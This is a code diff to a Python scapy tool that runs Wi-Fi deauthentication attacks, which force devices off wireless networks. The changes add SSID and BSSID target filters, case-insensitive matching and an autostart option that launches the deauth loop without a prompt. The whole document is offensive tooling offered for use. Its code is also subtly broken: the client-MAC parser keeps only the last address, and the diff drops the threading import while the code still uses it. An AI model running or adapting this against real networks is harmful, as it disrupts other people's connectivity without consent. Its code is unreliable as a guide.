@@ -3,7 +3,9 @@
 import signal
 import logging
 import argparse
-import threading
+
+from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, \
+    Dot11QoS, Dot11Deauth, Dot11
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
@@ -34,7 +36,7 @@ class Interceptor:
     _ABORT = False
 
     def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
-                bssid_name, custom_client_macs, custom_channels):
+                 ssid_name, bssid_addr, custom_client_macs, custom_channels, autostart):
         self.interface = net_iface
         self._channel_sniff_timeout = 2
         self._scan_intv = 0.1
@@ -66,37 +68,52 @@ class Interceptor:
         self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
         self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
 
-        self._custom_bssid_name: Union[str, None] = self.parse_custom_bssid_name(bssid_name)
+        self._custom_ssid_name: Union[str, None] = self.parse_custom_ssid_name(ssid_name)
+        self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
         self._custom_target_client_mac: Union[List[str], None] = self.parse_custom_client_mac(custom_client_macs)
-        self._custom_bssid_channels: List[int] = self.parse_custom_channels(custom_channels)
-        self._custom_bssid_last_ch = 0  # to avoid overlapping
+        self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
+        self._custom_target_ap_last_ch = 0  # to avoid overlapping
 
         self._midrun_output_buffer: List[str] = list()
         self._midrun_output_lck = threading.RLock()
 
+        self._autostart = autostart
+
     @staticmethod
-    def parse_custom_bssid_name(bssid_name: Union[None, str]) -> Union[None, str]:
-        if bssid_name is not None:
-            bssid_name = str(bssid_name)
-            if len(bssid_name) == 0:
-                print_error(f"Custom BSSID name cannot be an empty string")
-                raise Exception("Invalid BSSID name")
-        return bssid_name
+    def parse_custom_ssid_name(ssid_name: Union[None, str]) -> Union[None, str]:
+        if ssid_name is not None:
+            ssid_name = str(ssid_name)
+            if len(ssid_name) == 0:
+                print_error(f"Custom SSID name cannot be an empty string")
+                raise Exception("Invalid SSID name")
+        return ssid_name
+
+    @staticmethod
+    def parse_custom_bssid_addr(bssid_addr: Union[None, str]) -> Union[None, str]:
+        if bssid_addr is not None:
+            try:
+                bssid_addr = Interceptor.verify_mac_addr(bssid_addr)
+            except Exception as exc:
+                print_error(f"Invalid bssid address -> {bssid_addr}")
+                raise Exception("Bad custom BSSID mac address")
+        return bssid_addr
 
     @staticmethod
     def verify_mac_addr(mac_addr: str) -> str:
-        try:
-            RandMAC(mac_addr)
-            return mac_addr
-        except Exception as exc:
-            print_error(f"Invalid custom client mac address -> {mac_addr}")
-            raise Exception("Bad custom client mac address")
+        RandMAC(mac_addr)
+        return mac_addr
 
     @staticmethod
     def parse_custom_client_mac(client_mac_addrs: Union[None, str]) -> List[str]:
         custom_client_mac_list = list()
         if client_mac_addrs is not None:
-            custom_client_mac_list = [Interceptor.verify_mac_addr(mac) for mac in client_mac_addrs.split(',')]
+            for mac in client_mac_addrs.split(','):
+                try:
+                    custom_client_mac_list = list()
+                    custom_client_mac_list.append(Interceptor.verify_mac_addr(mac))
+                except Exception as exc:
+                    print_error(f"Invalid custom client mac address -> {mac}")
+                    raise Exception("Bad custom client mac address")
 
         if custom_client_mac_list:
             print_info(f"Disabling broadcast deauth, attacking custom clients instead: {custom_client_mac_list}")
@@ -153,32 +170,34 @@ class Interceptor:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                 ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
-                if ap_mac == BD_MACADDR or not ssid or (self._custom_bssid_name_is_set()
-                                                        and ssid != self._custom_bssid_name):
+                if ap_mac == BD_MACADDR or not ssid or (self._custom_ssid_name_is_set()
+                                                        and self._custom_ssid_name.lower() not in ssid.lower()):
+                    return
+                elif self._custom_bssid_addr_is_set() and ap_mac.lower() != self._custom_bssid_addr.lower():
                     return
                 pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
                 band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
                 if ssid not in self._all_ssids[band_type]:
                     self._all_ssids[band_type][ssid] = SSID(ssid, ap_mac, band_type)
                 self._all_ssids[band_type][ssid].add_channel(pkt_ch if pkt_ch in self._channel_range else self._current_channel_num)
-                if self._custom_bssid_name_is_set():
-                    self._custom_bssid_last_ch = self._all_ssids[band_type][ssid].channel
+                if self._custom_ssid_name_is_set():
+                    self._custom_target_ap_last_ch = self._all_ssids[band_type][ssid].channel
             else:
                 self._clients_sniff_cb(pkt)  # pass forward to find potential clients
         except Exception as exc:
             pass
 
     def _scan_channels_for_aps(self):
-        channels_to_scan = self._custom_bssid_channels or self._channel_range
+        channels_to_scan = self._custom_target_ap_channels or self._channel_range
         print_info(f"Starting AP scan, please wait... ({len(channels_to_scan)} channels total)")
-        if self._custom_bssid_name_is_set():
-            print_info(f"Scanning for target BSSID -> {self._custom_bssid_name}")
+        if self._custom_ssid_name_is_set():
+            print_info(f"Scanning for target SSID -> {self._custom_ssid_name}")
 
         try:
             for idx, ch_num in enumerate(channels_to_scan):
-                if self._custom_bssid_name_is_set() and self._found_custom_bssid_name() \
-                        and self._current_channel_num - self._custom_bssid_last_ch > 2:
-                    # make sure sniffing doesn't stop on an overlapped channel for custom BSSIDs
+                if self._custom_ssid_name_is_set() and self._found_custom_ssid_name() \
+                        and self._current_channel_num - self._custom_target_ap_last_ch > 2:
+                    # make sure sniffing doesn't stop on an overlapped channel for custom SSIDs
                     return
                 self._set_channel(ch_num)
                 print_info(f"Scanning channel {self._current_channel_num} (left -> "
@@ -188,15 +207,18 @@ class Interceptor:
         finally:
             printf("")
 
-    def _found_custom_bssid_name(self):
+    def _found_custom_ssid_name(self):
         for all_channel_aps in self._all_ssids.values():
             for ssid_name in all_channel_aps.keys():
-                if ssid_name == self._custom_bssid_name:
+                if ssid_name == self._custom_ssid_name:
                     return True
         return False
 
-    def _custom_bssid_name_is_set(self):
-        return self._custom_bssid_name is not None
+    def _custom_ssid_name_is_set(self):
+        return self._custom_ssid_name is not None
+
+    def _custom_bssid_addr_is_set(self):
+        return self._custom_bssid_addr is not None
 
     def _start_initial_ap_scan(self) -> SSID:
         self._scan_channels_for_aps()
@@ -226,6 +248,16 @@ class Interceptor:
         printf(DELIM)
 
         chosen = -1
+        if self._autostart:
+            if len(target_map) > 1:
+                print_error(f"Cannot autostart!")
+                print_error(f"Found more than 1 access points, try better filters "
+                            f"(i.e 5GHz vs 2.4GHz, BSSID address...)")
+            else:
+                print_info("One target was found, autostart was set to True")
+                chosen = 1
+
+        # won't enter loop if autostart was set
         while chosen not in target_map.keys():
             user_input = print_input(f"Choose a target from {min(target_map.keys())} to {max(target_map.keys())}:")
             try:
@@ -359,6 +391,7 @@ def main():
 
     if "linux" not in platform:
         raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
+    
 
     parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
     parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
@@ -367,22 +400,28 @@ def main():
                         default=False, dest="skip_monitormode", required=False)
     parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                         action='store_true', default=False, dest="kill_networkmanager", required=False)
-    parser.add_argument('-b', '--bssid', help='custom BSSID name (case-sensitive)', metavar="bssid_name",
+    parser.add_argument('-s', '--ssid', help='custom SSID name (case-insensitive)', metavar="ssid_name",
+                        action='store', default=None, dest="custom_ssid", required=False)
+    parser.add_argument('-b', '--bssid', help='custom BSSID address (case-insensitive)', metavar="bssid_addr",
                         action='store', default=None, dest="custom_bssid", required=False)
     parser.add_argument('-cm', '--clients', help='MAC addresses of target clients to disconnect,'
                                                  ' separated by a comma (i.e -> 00:1A:2B:3C:4D:5G,00:1a:2b:3c:4d:5e)', metavar="client_mac_addrs",
                         action='store', default=None, dest="custom_client_macs", required=False)
     parser.add_argument('-ch', '--channels', help='custom channels to scan, separated by a comma (i.e -> 1,3,4)',
                         metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
+    parser.add_argument('-a', '--autostart', help='autostart the de-auth loop (if the scan result contains a single access point)',
+                        action='store_true', default=False, dest="autostart", required=False)
     pargs = parser.parse_args()
 
     invalidate_print()  # after arg parsing
     attacker = Interceptor(net_iface=pargs.net_iface,
                            skip_monitor_mode_setup=pargs.skip_monitormode,
                            kill_networkmanager=pargs.kill_networkmanager,
-                           bssid_name=pargs.custom_bssid,
+                           ssid_name=pargs.custom_ssid,
+                           bssid_addr=pargs.custom_bssid,
                            custom_client_macs=pargs.custom_client_macs,
-                           custom_channels=pargs.custom_channels)
+                           custom_channels=pargs.custom_channels,
+                           autostart=pargs.autostart)
     attacker.run()
 
 
